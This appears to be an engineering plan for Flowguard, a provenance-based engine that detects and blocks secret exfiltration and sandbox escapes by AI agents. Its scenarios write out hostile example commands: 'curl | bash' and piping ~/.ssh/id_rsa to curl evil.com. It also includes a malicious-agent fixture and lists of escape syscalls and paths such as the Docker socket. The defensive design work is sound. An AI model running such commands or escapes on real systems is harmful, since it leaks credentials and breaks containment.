# Flowguard Implementation Plan

## Core Direction

Build Flowguard as its own provenance-aware enforcement engine for sandboxed agent execution.

Do not fork Falco. Falco is strong prior art for syscall telemetry and rule ideas, but Flowguard needs first-class provenance state: FD tables, append-only graph, label propagation, causal explanation paths, and dataflow-based blocking. Those are core engine responsibilities, not a thin rule layer.

Primary pipeline:

```text
agent launcher
-> confinement layer
-> event collector
-> event normalizer
-> runtime state
-> append-only provenance graph
-> label engine
-> policy engine
-> enforcement engine
-> explanation engine
```

The system must answer two questions:

- Should this action be allowed before it completes?
- If blocked or alerted, what exact source-to-sink path explains it?

Correctness priority:

- Missing flows are worse than overtainting.
- Blocking must happen at enforceable hooks, not after-the-fact alerts.
- Every provenance edge must correspond to an observed event.
- FD table resolution is authoritative.
- Every violation must include a reconstructable explanation path.

## Related Systems

Use these systems as reference points, not as architecture templates.

- Falco: mature syscall detection and rule taxonomy. Useful for event fields, suspicious behavior examples, and alert outputs. Not enough for provenance-first blocking.
- Tetragon: useful reference for eBPF-based runtime visibility and enforcement. Especially relevant for return-value override versus signal-based termination.
- KubeArmor: useful reference for LSM-backed policy enforcement over processes, files, and network behavior.
- Tracee: useful reference for eBPF event collection and security detections.
- AppArmor, SELinux, Landlock, seccomp: practical confinement and syscall/file-access control layers.
- gVisor and Firecracker: stronger sandbox substrates underneath Flowguard, not replacements for provenance.
- CamFlow, SPADE, PASS: provenance systems worth studying for graph collection, storage, and querying.

Design stance:

- Borrow telemetry ideas from Falco and Tracee.
- Borrow enforcement ideas from Tetragon, KubeArmor, Landlock, seccomp, and BPF-LSM.
- Keep Flowguard's graph, labels, policy decisions, and explanations as our own Rust core.

## Enforcement Model

Flowguard needs three enforcement planes.

### Static Confinement

Applied at agent launch before any provenance is known.

Block or restrict:

- namespace and mount changes: `setns`, `unshare`, `mount`, `pivot_root`, `chroot`
- privilege changes: `setuid`, `setgid`, `capset`, suspicious `prctl`
- process inspection/control: `ptrace`, dangerous `/proc/*` access
- kernel attack surface: `bpf`, `perf_event_open`, module loading
- host escape surfaces: `/var/run/docker.sock`, containerd sockets, host namespace handles, `/sys`, risky `/dev`

Possible mechanisms:

- seccomp filters
- seccomp user notification for brokered operations
- Landlock for unprivileged filesystem and network restrictions
- AppArmor or SELinux profiles
- BPF-LSM where available
- gVisor or Firecracker as stronger isolation substrate

### Dynamic Provenance Enforcement

Applied when a syscall/event depends on runtime dataflow state.

MVP policies:

- `EXTERNAL -> EXEC`: block or alert when network-derived data reaches execution.
- `SECRET -> SEND`: block when secret-derived data reaches network send.
- `PROMPT -> shell without APPROVED`: require approval for agent-driven shell/interpreter execution.
- `EXTERNAL -> executable write`: alert when external data writes to executable locations.

Additional sandbox policies:

- `PROMPT|EXTERNAL -> sandbox escape primitive`
- `PROMPT|EXTERNAL -> container runtime socket`
- `PROMPT|EXTERNAL -> persistence write`
- `SECRET -> process argument/env/log file`
- outbound network to non-allowlisted endpoints

### Approval Broker

Approval must be explicit, scoped, and explainable.

Approval scope should include:

- process identity: PID plus start time
- command or syscall family
- destination path or endpoint
- policy being waived
- timestamp and TTL

No global ambient approval.

## Engine Phases

### Phase 1: Synthetic Engine

Goal: deterministic correctness without kernel integration.

Implemented:

- Rust crate skeleton
- domain event model
- runtime process/FD/socket state
- append-only graph API
- label state with path witnesses
- policy decision API
- explanation path reconstruction
- `curl | bash` scenario: `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` scenario: `SECRET -> SEND`

Next work:

- add `CONNECT` graph edges
- add structured warnings for inconsistent state instead of panics
- add `Prompt -> Shell without approval`
- add `External -> executable write`
- add explicit config for secret paths, executable paths, interpreters, and endpoint allowlists

### Phase 2: Policy Completeness

Goal: cover the core agent threat model with synthetic scenarios.

Scenario set:

- `curl | bash` -> `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` -> `SECRET -> SEND`
- agent runs `bash -c ...` without approval -> `PROMPT -> shell`
- approval event allows one scoped shell action -> no violation
- downloaded script writes `/usr/local/bin/tool`, then executes -> external executable write and exec
- agent accesses Docker socket -> sandbox escape alert/block
- agent calls `setns` or `mount` -> sandbox escape block
- agent writes cron/systemd/shell rc/SSH config -> persistence alert/block
- dup/pipe/close chain across processes -> FD correctness
- missing FD, unknown process, PID reuse -> structured warning and continued operation

Policy behavior:

- deterministic decision
- one or more violations
- every violation includes sink event and source-to-sink explanation path
- blockable sinks are represented separately from alert-only sinks

### Phase 3: Live Telemetry

Goal: feed real syscall-level events into the same engine.

Collector options:

- eBPF tracepoints/kprobes for telemetry
- auditd as a fallback event source
- Falco/Tracee/Tetragon as optional external event sources

Normalizer requirements:

- convert raw events into Flowguard domain events
- preserve timestamp and event id
- resolve process identity as PID plus start time
- never guess FD mappings
- surface inconsistent state as warnings

### Phase 4: Real Blocking

Goal: prevent leaks and escapes in live agent sandboxes.

Start narrow:

- block `execve` for `EXTERNAL -> EXEC`
- block `sendmsg`/`sendto`/`write` to socket for `SECRET -> NETWORK`
- block `openat/openat2` for sensitive host paths
- block `mount`, `setns`, `unshare`, `ptrace`, `bpf`, `capset`
- block writes to persistence and executable locations

Mechanism order:

- use static seccomp/Landlock/AppArmor constraints first
- use seccomp user notification for brokered decisions where feasible
- use BPF-LSM for lower-level blocking where available
- use eBPF telemetry for observation and explanation, not as the only blocking layer

## Module Ownership

- `events`: observed domain events only
- `state`: process table, FD table, socket mappings, object resolution
- `graph`: append-only node and edge storage
- `labels`: seed labels, propagation rules, witness paths
- `policy`: deterministic rules and decisions
- `explain`: source-to-sink explanation reconstruction
- `enforce`: allow/alert/approval/block outcomes
- `scenarios`: deterministic event replay and scenario tests

Keep these responsibilities separate. `scenarios` may orchestrate but must not own business logic.

## Immediate Next Steps

1. Build the secret-exfiltration MVP demo.
2. Add `CONNECT` edge creation and tests.
3. Replace replay panics with structured warnings while keeping tests strict.
4. Add `Prompt -> Shell without approval` scenario and policy.
5. Add config object for secret paths, interpreters, executable locations, blocked paths, and network allowlists.
6. Update `docs/design.md` to match this prevention-first architecture.

## MVP Demo Plan

Goal: demonstrate Flowguard blocking an agent or application that tries to leak sensitive data over the network.

The demo should make the core value obvious:

- without Flowguard, the agent would send the secret
- with Flowguard, the `SEND` sink is blocked
- the block includes a reconstructable explanation path

### Demo Scenario

Use a controlled malicious-agent fixture.

Behavior:

- read fake secret file: `fixtures/home/.ssh/id_rsa`
- pass contents through a pipe or subprocess boundary
- send data to `evil.example:443`

Expected Flowguard decision:

```text
BLOCK SecretToNetwork
```

Expected explanation:

```text
file:/home/user/.ssh/id_rsa --READ--> proc:cat
proc:cat --WRITE--> pipe:2
pipe:2 --READ--> proc:curl
proc:curl --SEND--> endpoint:evil.example:443
```

### Replayable Scenario Files

Add scenario files under `scenarios/`.

First scenario:

```text
scenarios/secret_exfil.yaml
```

It should encode ordered observed events:

- `AgentLaunch`
- `Pipe`
- `Fork`
- `Dup`
- `Open`
- `Read`
- `Write`
- `Read`
- `Connect`
- `Send`

Reason: scenario files make demos easier to inspect, modify, and explain than hard-coded Rust fixtures.

### CLI Demo

Add a CLI binary:

```text
cargo run -- replay scenarios/secret_exfil.yaml
```

Minimum output:

```text
BLOCK SecretToNetwork

sink:
  SEND proc:curl -> endpoint:evil.example:443

why:
  file:/home/user/.ssh/id_rsa --READ--> proc:cat
  proc:cat --WRITE--> pipe:2
  pipe:2 --READ--> proc:curl
  proc:curl --SEND--> endpoint:evil.example:443
```

CLI requirements:

- parse scenario file
- replay through existing engine
- print decision
- print sink event
- print explanation path
- exit nonzero on `Block`

### Allow/Block Comparison

Add two demo modes:

```text
cargo run -- replay scenarios/secret_exfil.yaml --mode observe
cargo run -- replay scenarios/secret_exfil.yaml --mode enforce
```

Expected behavior:

- `observe`: reports that `SECRET -> NETWORK` would be blocked
- `enforce`: marks the `SEND` event as blocked

This demonstrates the difference between passive detection and prevention.

### Live-ish Wrapper

After replay CLI works, add a small controlled wrapper:

```text
cargo run -- demo secret-exfil
```

The wrapper can launch a demo process or simulate wrapper-emitted events. It does not need eBPF yet.

Purpose:

- make the demo feel closer to a real agent
- keep Phase 1 deterministic
- avoid kernel integration before provenance and explanation are stable

### MVP Acceptance Criteria

- `cargo test` passes
- `cargo run -- replay scenarios/secret_exfil.yaml` prints a block
- output includes policy name, sink event, and full source-to-sink path
- a benign scenario that sends non-secret data is allowed
- demo can be explained in under one minute
